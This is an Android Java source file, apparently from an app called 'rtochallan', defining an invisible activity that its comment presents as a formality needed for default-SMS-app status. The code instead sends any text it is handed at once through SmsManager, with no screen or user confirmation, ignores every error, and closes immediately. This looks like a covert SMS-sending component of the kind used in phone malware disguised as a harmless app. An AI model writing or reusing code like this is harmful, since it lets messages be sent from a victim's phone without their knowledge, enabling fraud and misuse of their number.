package com.rtochallan;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsManager;

/**
 * ComposeSmsActivity - Invisible activity required for default SMS app compliance.
 * This activity handles SENDTO intents for sms/smsto schemes, extracts the target number
 * and message body, sends the SMS silently using SmsManager, and finishes immediately.
 * It exists solely to satisfy Android's default SMS app requirements.
 */
public class ComposeSmsActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent intent = getIntent();
        if (intent != null && Intent.ACTION_SENDTO.equals(intent.getAction())) {
            Uri uri = intent.getData();
            if (uri != null && ("sms".equals(uri.getScheme()) || "smsto".equals(uri.getScheme()))) {
                String targetNumber = uri.getSchemeSpecificPart();
                String messageBody = intent.getStringExtra(Intent.EXTRA_TEXT);

                if (targetNumber != null && messageBody != null) {
                    try {
                        SmsManager smsManager = SmsManager.getDefault();
                        smsManager.sendTextMessage(targetNumber, null, messageBody, null, null);
                    } catch (Exception e) {
                        // Silently ignore failures
                    }
                }
            }
        }

        // Finish immediately as this activity should not be visible
        finish();
    }
}
